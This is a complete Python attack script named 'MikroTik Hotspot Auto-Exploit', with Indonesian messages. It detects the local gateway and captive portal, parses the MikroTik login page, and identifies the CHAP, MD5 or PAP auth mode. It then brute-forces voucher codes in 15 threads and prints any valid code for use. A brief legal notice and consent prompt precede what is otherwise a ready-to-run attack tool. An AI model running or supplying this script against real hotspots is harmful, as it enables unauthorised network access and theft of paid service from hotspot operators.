#!/usr/bin/env python3
"""
MikroTik Hotspot Auto-Exploit - Fully Automatic
No manual IP input. Auto-detects gateway, hotspot, auth mode, and brute forces.
"""

import os
import sys
import time
import re
import socket
import ssl
import hashlib
import string
import random
import threading
import urllib.request
import urllib.error
import urllib.parse
import subprocess
from concurrent.futures import ThreadPoolExecutor, as_completed

# ── Colors ──
R = "\033[91m"
G = "\033[92m"
Y = "\033[93m"
C = "\033[96m"
B = "\033[1m"
D = "\033[2m"
Z = "\033[0m"

USER_AGENT = "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"

def banner():
    print(f"\n{G}{B}")
    print("  ╔══════════════════════════════════════════╗")
    print("  ║  MikroTik Hotspot Auto-Exploit v2.0     ║")
    print(f"  ║  {Y}Fully Automatic - No Input Needed{Z}{G}{B}       ║")
    print("  ╚══════════════════════════════════════════╝")
    print(Z)

def info(msg):
    print(f"  {C}[*]{Z} {msg}")

def ok(msg):
    print(f"  {G}[+]{Z} {msg}")

def warn(msg):
    print(f"  {Y}[!]{Z} {msg}")

def error(msg):
    print(f"  {R}[-]{Z} {msg}")

def kritikal(msg):
    print(f"  {R}{B}[!!] {msg}{Z}")


# ── 1. AUTO-DETECT GATEWAY ──

def get_gateway():
    info("Auto-detecting gateway...")
    try:
        out = subprocess.check_output(["ip", "route", "show", "default"], text=True, timeout=3)
        for line in out.strip().split("\n"):
            parts = line.split()
            if "default" in parts or "0.0.0.0" in parts:
                for i, p in enumerate(parts):
                    if p == "via" and i + 1 < len(parts):
                        gw = parts[i + 1]
                        ok(f"Gateway: {gw}")
                        return gw
        m = re.search(r"default\s+(?:via\s+)?([\d.]+)", out)
        if m:
            gw = m.group(1)
            ok(f"Gateway: {gw}")
            return gw
    except Exception as e:
        error(f"ip route gagal: {e}")

    try:
        out = subprocess.check_output(["ip", "route"], text=True, timeout=3)
        m = re.search(r"default\s+(?:via\s+)?([\d.]+)", out)
        if m:
            gw = m.group(1)
            ok(f"Gateway: {gw}")
            return gw
    except Exception:
        pass

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 53))
        local_ip = s.getsockname()[0]
        s.close()
        gw = ".".join(local_ip.split(".")[:3]) + ".1"
        warn(f"Fallback: asumsi gateway = {gw}")
        return gw
    except Exception:
        pass

    error("Tidak bisa deteksi gateway.")
    return None


# ── 2. HTTP HELPERS ──

def _ssl_ctx():
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx

def _http(method, url, data=None, headers=None, timeout=5, follow=True):
    if "://" not in url:
        url = "http://" + url
    hdrs = {"User-Agent": USER_AGENT, "Accept": "text/html,application/xhtml+xml"}
    if headers:
        hdrs.update(headers)

    try:
        body_bytes = None
        if data:
            if isinstance(data, dict):
                body_bytes = urllib.parse.urlencode(data).encode()
            elif isinstance(data, str):
                body_bytes = data.encode()
            elif isinstance(data, bytes):
                body_bytes = data
            hdrs.setdefault("Content-Type", "application/x-www-form-urlencoded")

        opener = urllib.request.build_opener(
            urllib.request.HTTPSHandler(context=_ssl_ctx()),
            urllib.request.HTTPRedirectHandler() if follow else urllib.request.HTTPHandler(),
        )
        req = urllib.request.Request(url, data=body_bytes, headers=hdrs, method=method)
        resp = opener.open(req, timeout=timeout)
        body = resp.read().decode("utf-8", errors="ignore")
        return {"ok": True, "status": resp.status, "headers": dict(resp.headers), "body": body, "url": resp.url}
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", errors="ignore") if e.fp else ""
        return {"ok": False, "status": e.code, "headers": dict(e.headers) if e.headers else {}, "body": body, "url": e.url}
    except Exception as e:
        return {"ok": False, "status": 0, "body": str(e), "url": url}


# ── 3. DETECT HOTSPOT ──

def detect_hotspot(gateway):
    info("Detecting hotspot login page...")

    # Try to trigger redirect by requesting external site
    test_urls = [
        "http://www.google.com",
        "http://detectportal.firefox.com/success.txt",
        "http://captive.apple.com/hotspot-detect.html",
        f"http://{gateway}/",
        f"http://{gateway}/login",
    ]

    session = {
        "gateway": gateway,
        "hotspot_found": False,
        "login_url": "",
        "auth_mode": "unknown",
        "md5_challenge": None,
        "user_field": "username",
        "pass_field": "password",
        "extra_fields": {},
        "action_url": "",
        "dns_name": None,
        "cookies": {},
        "error_signature": "",
    }

    login_body = ""
    login_headers = {}

    for url in test_urls:
        r = _http("GET", url, timeout=5)
        if r["status"] in [200, 302, 303, 307]:
            final_url = r["url"]
            body = r["body"]

            # Check if we've been redirected to a hotspot login
            if "hotspot" in body.lower() or "mikrotik" in body.lower():
                login_body = body
                login_headers = r["headers"]
                session["login_url"] = final_url
                session["hotspot_found"] = True
                ok(f"Hotspot terdeteksi! Login URL: {final_url}")
                break

            # Check for MikroTik-specific indicators
            if "md5.js" in body or "hexMD5" in body:
                login_body = body
                login_headers = r["headers"]
                session["login_url"] = final_url
                session["hotspot_found"] = True
                ok(f"MikroTik Hotspot terdeteksi! (md5.js found)")
                break

            # Check redirect to gateway login
            if gateway in final_url and ("login" in final_url.lower() or "hotspot" in final_url.lower()):
                login_body = body
                login_headers = r["headers"]
                session["login_url"] = final_url
                session["hotspot_found"] = True
                ok(f"Redirect ke hotspot login: {final_url}")
                break

    if not session["hotspot_found"]:
        # Last attempt: direct access to gateway
        r = _http("GET", f"http://{gateway}/login", timeout=5)
        if r["status"] == 200 and ("hotspot" in r["body"].lower() or "mikrotik" in r["body"].lower()):
            login_body = r["body"]
            login_headers = r["headers"]
            session["login_url"] = r["url"]
            session["hotspot_found"] = True
            ok(f"Hotspot terdeteksi via direct /login")

    if not session["hotspot_found"]:
        error("Hotspot tidak terdeteksi. Pastikan terhubung ke WiFi hotspot.")
        return None

    # Parse cookies
    for c in login_headers.get("Set-Cookie", "").split(","):
        if "=" in c:
            k, v = c.split(";")[0].split("=", 1)
            session["cookies"][k.strip()] = v.strip()

    # Extract DNS name from URL
    parsed = urllib.parse.urlparse(session["login_url"])
    if parsed.hostname and parsed.hostname != gateway:
        session["dns_name"] = parsed.hostname
        info(f"DNS name hotspot: {parsed.hostname}")

    # Parse login page
    return _parse_login_page(session, login_body)


def _parse_login_page(session, body):
    info("Analyzing login page...")

    # Find form action
    m = re.search(r'<form[^>]*action\s*=\s*["\']([^"\']*)["\']', body, re.I)
    if m:
        action = m.group(1)
        if action.startswith("http"):
            session["action_url"] = action
        else:
            base = f"http://{session['gateway']}"
            if session["dns_name"]:
                base = f"http://{session['dns_name']}"
            session["action_url"] = urllib.parse.urljoin(session["login_url"], action)
    else:
        session["action_url"] = session["login_url"]

    ok(f"Action URL: {session['action_url']}")

    # Extract hidden fields
    for m in re.finditer(r'<input[^>]*type\s*=\s*["\']hidden["\'][^>]*>', body, re.I):
        tag = m.group()
        nm = re.search(r'name\s*=\s*["\']([^"\']*)["\']', tag, re.I)
        vl = re.search(r'value\s*=\s*["\']([^"\']*)["\']', tag, re.I)
        if nm:
            session["extra_fields"][nm.group(1)] = vl.group(1) if vl else ""

    if session["extra_fields"]:
        ok(f"Hidden fields: {list(session['extra_fields'].keys())}")

    # Extract user/pass field names
    for m in re.finditer(r'name\s*=\s*["\']([^"\']*(?:user|login|name)[^"\']*)["\']', body, re.I):
        candidate = m.group(1).lower()
        if "password" not in candidate and "pass" not in candidate:
            session["user_field"] = m.group(1)
            break

    for m in re.finditer(r'name\s*=\s*["\']([^"\']*(?:pass|pwd|secret|key)[^"\']*)["\']', body, re.I):
        session["pass_field"] = m.group(1)
        break

    ok(f"Fields: {session['user_field']} / {session['pass_field']}")

    # ── DETECT AUTH MODE ──
    body_lower = body.lower()

    if "md5.js" in body_lower or "hexmd5" in body_lower or "hex_md5" in body_lower:
        info("MD5.js detected — CHAP mode")
        session["auth_mode"] = "chap"

        # Extract challenge
        for pattern in [
            r'(?:var\s+)?challenge\s*=\s*["\']([a-fA-F0-9]{16,})["\']',
            r'["\']([a-fA-F0-9]{30,})["\'].*challenge',
            r'hexMD5\s*\(\s*["\']([a-fA-F0-9]+)["\']',
        ]:
            m = re.search(pattern, body, re.I)
            if m:
                session["md5_challenge"] = m.group(1)
                ok(f"MD5 challenge: {session['md5_challenge'][:40]}...")
                break

    elif "\\000" in body or "\\x00" in body or "char(0)" in body_lower:
        info("Old MD5 mode (\\x00 prefix)")
        session["auth_mode"] = "md5_simple"

    else:
        info("No MD5 detected — assuming PAP mode (plaintext)")
        session["auth_mode"] = "pap"

    # ── TEST LOGIN for error signature ──
    info("Testing login to learn error pattern...")
    test_code = "___PROBE___XX___"
    test_hash = compute_md5(session["md5_challenge"], test_code, session["auth_mode"])

    data = {
        session["user_field"]: test_code,
        session["pass_field"]: test_hash if session["auth_mode"] != "pap" else test_code,
    }
    data.update(session["extra_fields"])

    hdrs = {}
    if session["cookies"]:
        hdrs["Cookie"] = "; ".join(f"{k}={v}" for k, v in session["cookies"].items())

    test_r = _http("POST", session["action_url"], data=data, headers=hdrs, timeout=5)

    if test_r["body"]:
        sample = test_r["body"][:300].lower()
        session["error_signature"] = sample[:100]
        session["error_status"] = test_r["status"]

        if test_r["status"] in [302, 303, 307]:
            warn("INJECT: test login resulted in REDIRECT — hotspot in PAP mode!")
            session["auth_mode"] = "pap"
        elif "invalid" in sample:
            ok("Error: 'invalid' response (normal)")
        elif "salah" in sample:
            ok("Error: 'salah' response (normal)")

    print()
    print(f"  {B}─── Hotspot Analysis ───{Z}")
    print(f"  Gateway      : {C}{session['gateway']}{Z}")
    print(f"  Login URL    : {C}{session['login_url']}{Z}")
    print(f"  Action URL   : {C}{session['action_url']}{Z}")
    print(f"  DNS name     : {session['dns_name'] or '(none)'}")
    print(f"  Auth mode    : {Y}{session['auth_mode'].upper()}{Z}")
    print(f"  MD5 challenge: {str(session['md5_challenge'])[:40]}")
    print(f"  User field   : {session['user_field']}")
    print(f"  Pass field   : {session['pass_field']}")
    print(f"  Extra fields : {list(session['extra_fields'].keys())}")
    print(f"  Error sig    : {D}{str(session['error_signature'])[:60]}{Z}")
    print()

    return session


# ── 4. MD5 HELPERS ──

def compute_md5(challenge, password, mode):
    if mode == "md5_simple":
        return hashlib.md5(b"\x00" + password.encode()).hexdigest()
    elif mode == "chap":
        if challenge:
            try:
                nonce = bytes.fromhex(challenge) if all(c in "0123456789abcdefABCDEF" for c in challenge) else challenge.encode()
            except Exception:
                nonce = challenge.encode()
            return hashlib.md5(nonce + password.encode()).hexdigest()
        else:
            return hashlib.md5(password.encode()).hexdigest()
    else:
        return hashlib.md5(b"\x00" + password.encode()).hexdigest()


# ── 5. GENERATE CANDIDATES ──

def gen_candidates():
    c = []

    # Sequential
    for i in range(1000, 3000):
        c.append(str(i))
    for i in range(10000, 11000):
        c.append(str(i))

    # Date
    now = time.localtime()
    y, mo, d = now.tm_year, now.tm_mon, now.tm_mday
    for variant in [
        f"{y}{mo:02d}{d:02d}", f"{d:02d}{mo:02d}{y}",
        f"{y%100:02d}{mo:02d}{d:02d}", f"{d:02d}{mo:02d}{y%100:02d}",
        f"{y}{mo:02d}", f"{mo:02d}{y%100:02d}",
        f"{mo:02d}{d:02d}", f"{d:02d}{mo:02d}",
    ]:
        c.append(variant)

    # Dictionary
    words = [
        "wifi", "hotspot", "internet", "free", "net", "wlan", "admin",
        "guest", "tamu", "user", "test", "demo", "trial", "voucher",
        "cepat", "murah", "malam", "pagi", "bulan", "paket", "minggu",
        "harian", "jam", "1jam", "2jam", "3jam", "1hari", "7hari",
        "30hari", "1bulan", "unlimited", "123456", "12345678",
    ]
    for w in words:
        c.append(w)
        c.append(w + "123")
        c.append(w + "1234")
        c.append(w + "1")
        c.append("123" + w)
        c.append(w.upper())

    # Random alphanumeric
    for _ in range(1000):
        length = random.choice([6, 8, 10])
        chars = string.digits + string.ascii_uppercase
        c.append("".join(random.choice(chars) for _ in range(length)))

    # Common MikroTik vouchers
    common = [
        "123", "1234", "12345", "123456", "1234567", "12345678",
        "0000", "1111", "2222", "3333", "4444", "5555", "6666",
        "7777", "8888", "9999", "000000", "111111", "999999",
        "admin", "password", "pass", "qwerty", "abc123",
        "letmein", "welcome", "master", "changeme",
    ]
    c.extend(common)

    return list(dict.fromkeys(c))


# ── 6. BRUTE FORCE ──

def brute_force(session):
    print(f"{B}  ─── STARTING BRUTE FORCE ───{Z}")
    print(f"  Auth mode: {Y}{session['auth_mode'].upper()}{Z}")

    candidates = gen_candidates()
    info(f"Generated {len(candidates)} voucher candidates")
    info(f"Starting multi-thread brute force...")
    print(f"  {D}Ctrl+C to stop{Z}\n")

    tested = 0
    found = []
    start_time = time.time()
    lock = threading.Lock()
    stop = threading.Event()

    def try_one(code):
        if stop.is_set():
            return
        ok_, result = _attempt_login(session, code)
        with lock:
            nonlocal tested
            tested += 1
            if ok_:
                found.append(code)
                stop.set()

    max_workers = 15
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = [executor.submit(try_one, c) for c in candidates]
        for future in as_completed(futures):
            with lock:
                elapsed = max(time.time() - start_time, 0.01)
                rate = tested / elapsed
                print(f"\r  {D}[{int(elapsed)}s]{Z} Tested: {tested}/{len(candidates)} | "
                      f"{rate:.1f}/s | Found: {G}{len(found)}{Z}   ", end="")
            if stop.is_set():
                for f in futures:
                    f.cancel()
                break

    print("\n")
    if found:
        kritikal(f"VOUCHER VALID DITEMUKAN!")
        for f in found:
            print(f"    {G}{B}{f}{Z}")
        return found
    else:
        warn("Tidak ada voucher ditemukan.")
        return []


def _attempt_login(session, code):
    try:
        user = session["user_field"]
        pwd = session["pass_field"]

        pass_val = code
        if session["auth_mode"] in ("chap", "md5_simple"):
            pass_val = compute_md5(session["md5_challenge"], code, session["auth_mode"])

        data = {user: code, pwd: pass_val}
        data.update(session.get("extra_fields", {}))

        hdrs = {}
        if session.get("cookies"):
            hdrs["Cookie"] = "; ".join(f"{k}={v}" for k, v in session["cookies"].items())

        r = _http("POST", session["action_url"], data=data, headers=hdrs, timeout=5)

        status = r["status"]
        body = (r["body"] or "").lower()

        # Success indicators
        if status in [302, 303, 307]:
            return True, code
        if "logged in" in body or "welcome" in body:
            return True, code
        if status == 200 and len(body) < 30:
            return True, code

        # Error signature check
        err_sig = session.get("error_signature", "")
        if err_sig and err_sig[:30] in body:
            return False, code

        # Still on login page?
        if "<form" in body or "login" in body:
            return False, code

        return False, code
    except Exception:
        return False, code


# ── 7. MAIN ──

def main():
    banner()

    print(f"  {R}{B}[!] LEGAL: Hanya untuk jaringan MILIK SENDIRI!{Z}")
    print(f"  {R}{B}[!] Penggunaan tanpa izin = TINDAK PIDANA (UU ITE Pasal 30){Z}")
    print()
    try:
        ans = input(f"  {Y}[?] Anda setuju & bertanggung jawab? (ya/tidak): {Z}").strip().lower()
        if ans not in ("ya", "y", "yes"):
            print(f"\n  {R}[!] Dibatalkan.{Z}")
            sys.exit(0)
    except KeyboardInterrupt:
        sys.exit(0)

    print()

    # Step 1: Get gateway
    gw = get_gateway()
    if not gw:
        error("Tidak bisa lanjut tanpa gateway.")
        sys.exit(1)

    print()

    # Step 2: Detect hotspot
    session = detect_hotspot(gw)
    if not session:
        sys.exit(1)

    # Step 3: Brute force
    found = brute_force(session)

    # Step 4: Report
    print()
    if found:
        print(f"  {G}{B}╔══════════════════════════════════╗{Z}")
        print(f"  {G}{B}║  VOUCHER DITEMUKAN!              ║{Z}")
        print(f"  {G}{B}║  GUNAKAN KODE DI BAWAH INI       ║{Z}")
        print(f"  {G}{B}╚══════════════════════════════════╝{Z}")
        for f in found:
            print(f"  {G}{B}  >  {f}{Z}")
    else:
        print(f"  {Y}Tidak ada voucher ditemukan.{Z}")
        print(f"  {Y}Kemungkinan: pola kustom / rate-limited / wordlist kurang.{Z}")
        print(f"  {Y}Coba: tambah wordlist kustom di manual mode.{Z}")

    print()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n  {R}[!] Stopped.{Z}")
        sys.exit(0)
